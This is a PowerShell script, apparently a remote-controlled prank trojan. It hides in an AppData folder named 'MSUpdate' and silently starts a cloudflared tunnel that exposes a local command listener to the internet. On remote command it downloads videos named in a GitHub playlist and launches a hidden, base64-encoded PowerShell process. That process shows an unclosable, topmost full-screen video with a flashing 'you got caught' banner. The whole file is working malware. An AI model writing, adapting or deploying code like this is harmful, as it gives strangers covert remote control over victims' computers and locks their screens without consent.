$github       = "NodeNode30-30"
$repo         = "system-libs"
$branch       = "main"
$playlist     = "playlist.txt"

$workDir      = "$env:USERPROFILE\AppData\Local\Microsoft\MSUpdate"
$cfPath       = "$workDir\cloudflared.exe"
$listenerPort = 1337
$playedFile   = "$workDir\played.txt"
$flagFile     = "$workDir\play.flag"
$stopFile     = "$workDir\stop.now"
$pidFile      = "$workDir\player.pid"

if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }

$PID | Set-Content $pidFile -Force

function Get-GitHubFile($path) {
    $url = "https://raw.githubusercontent.com/$github/$repo/$branch/$path"
    try {
        return (Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop).Content
    } catch {
        return $null
    }
}

# 1. Скачивание cloudflared
if (-not (Test-Path $cfPath)) {
    $url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    try {
        Invoke-WebRequest -Uri $url -OutFile $cfPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
    } catch {
        Write-Host "Ошибка скачивания cloudflared"
    }
}

# 2. Запуск туннеля и сохранение ссылки в Загрузки (увеличен таймаут ожидания до 60 секунд)
if (Test-Path $cfPath) {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $cfPath
    $psi.Arguments = "tunnel --url http://localhost:$listenerPort --logfile `"$workDir\tunnel.log`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null

    $downloadsFolder = Join-Path $env:USERPROFILE "Downloads"
    $urlFile = Join-Path $downloadsFolder "tunnel_url.txt"

    Start-Job -ScriptBlock {
        param($logPath, $outFile)
        for ($i = 0; $i -lt 60; $i++) {
            Start-Sleep -Seconds 1
            if (Test-Path $logPath) {
                $match = Select-String -Path $logPath -Pattern "https://.*\.trycloudflare\.com" | Select-Object -First 1
                if ($match) {
                    $match.Matches.Value | Set-Content $outFile -Force
                    break
                }
            }
        }
    } -ArgumentList "$workDir\tunnel.log", $urlFile | Out-Null
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:$listenerPort/")
$listener.Start()

function Send-Response($ctx, $msg) {
    $buffer = [System.Text.Encoding]::UTF8.GetBytes($msg)
    $ctx.Response.ContentLength64 = $buffer.Length
    $ctx.Response.OutputStream.Write($buffer, 0, $buffer.Length)
    $ctx.Response.Close()
}

function Stop-All {
    if (Test-Path $flagFile) { [System.IO.File]::WriteAllText($flagFile, "0") }
    # Жёстко гасим процесс WPF-окна
    Get-Process -Name "powershell","pwsh" -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "WpfPlayer" } | Stop-Process -Force
    if (Test-Path "$workDir\video.mp4") { Remove-Item "$workDir\video.mp4" -Force -ErrorAction SilentlyContinue }
}

while ($listener.IsListening) {
    $ctx = $listener.GetContext()
    $path = $ctx.Request.Url.AbsolutePath

    switch ($path) {
        "/play" {
            try {
                Stop-All
                Start-Sleep -Seconds 1

                $content = Get-GitHubFile $playlist
                if (-not $content) {
                    Send-Response $ctx "Error: Не удалось загрузить плейлист с GitHub"
                    continue
                }

                $urls = $content -split "`r?`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
                $played = @()
                if (Test-Path $playedFile) { $played = Get-Content $playedFile }
                
                $next = $urls | Where-Object { $_ -notin $played } | Select-Object -First 1
                if ($next) {
                    $outFile = "$workDir\video.mp4"
                    
                    try {
                        Invoke-WebRequest -Uri $next -OutFile $outFile -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
                    } catch {
                        Send-Response $ctx "Error downloading video: $_"
                        continue
                    }
                    
                    [System.IO.File]::WriteAllText($flagFile, "1")
                    
                    # НАДЁЖНЫЙ ЗАПУСК ПЛЕЕРА В ОТДЕЛЬНОМ STA-ПРОЦЕССЕ
                    $playerScript = @"
                        Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase
                        `$win = New-Object System.Windows.Window
                        `$win.Title = 'WpfPlayer'
                        `$win.WindowState = 'Maximized'
                        `$win.WindowStyle = 'None'
                        `$win.ResizeMode = 'NoResize'
                        `$win.Topmost = `$true
                        `$win.ShowInTaskbar = `$false
                        `$win.Background = [System.Windows.Media.Brushes]::Black
                        `$win.Cursor = [System.Windows.Input.Cursors]::None

                        `$win.Add_Closing({ if (-not `$script:allowClose) { `$_.Cancel = `$true } })

                        `$me = New-Object System.Windows.Controls.MediaElement
                        `$me.Source = New-Object System.Uri('$outFile')
                        `$me.LoadedBehavior = 'Play'
                        `$me.Add_MediaEnded({ `$me.Position = [TimeSpan]::Zero; `$me.Play() })

                        `$banner = New-Object System.Windows.Controls.TextBlock
                        `$banner.Text = 'ПОЗДРАВЛЯЮ, ТЫ ПОПАЛСЯ :D'
                        `$banner.FontSize = 48
                        `$banner.FontWeight = 'Bold'
                        `$banner.Foreground = [System.Windows.Media.Brushes]::Red
                        `$banner.HorizontalAlignment = 'Center'
                        `$banner.VerticalAlignment = 'Bottom'
                        `$banner.Margin = '0,0,0,80'

                        `$grid = New-Object System.Windows.Controls.Grid
                        `$grid.Children.Add(`$me) | Out-Null
                        `$grid.Children.Add(`$banner) | Out-Null
                        `$win.Content = `$grid

                        `$timer = New-Object System.Windows.Threading.DispatcherTimer
                        `$timer.Interval = [TimeSpan]::FromMilliseconds(400)
                        `$timer.Add_Tick({ `$banner.Opacity = 1 - `$banner.Opacity })
                        `$timer.Start()

                        `$win.Add_PreviewKeyDown({
                            param(`$s, `$e)
                            if (`$e.Key -eq 'Q' -and [System.Windows.Input.Keyboard]::Modifiers -band 3) {
                                `$script:allowClose = `$true
                                New-Item '$stopFile' -ItemType File -Force | Out-Null
                                `$win.Close()
                            }
                        })

                        `$app = New-Object System.Windows.Application
                        `$app.Run(`$win)
"@
                    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($playerScript))
                    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" -WindowStyle Hidden

                    Add-Content $playedFile $next
                    Send-Response $ctx "Playing in WPF full-screen: $next"
                } else {
                    Send-Response $ctx "All videos played"
                }
            } catch {
                Send-Response $ctx "Error: $_"
            }
        }
        "/next" {
            Stop-All
            $ctx.Response.Redirect("/play")
            $ctx.Response.Close()
        }
        "/stop" {
            Stop-All
            Send-Response $ctx "Stopped"
        }
        "/tunnel" {
            if (Test-Path "$workDir\tunnel.log") {
                $match = Select-String -Path "$workDir\tunnel.log" -Pattern "https://.*\.trycloudflare\.com" | Select-Object -First 1
                if ($match) {
                    Send-Response $ctx $match.Matches.Value
                } else {
                    Send-Response $ctx "Tunnel log found, waiting for URL..."
                }
            } else {
                Send-Response $ctx "Log file not found"
            }
        }
        "/exit" {
            Stop-All
            Send-Response $ctx "Bye"
            [System.Environment]::Exit(0)
        }
        default {
            Send-Response $ctx "Commands: /play, /next, /stop, /tunnel, /exit"
        }
    }
}
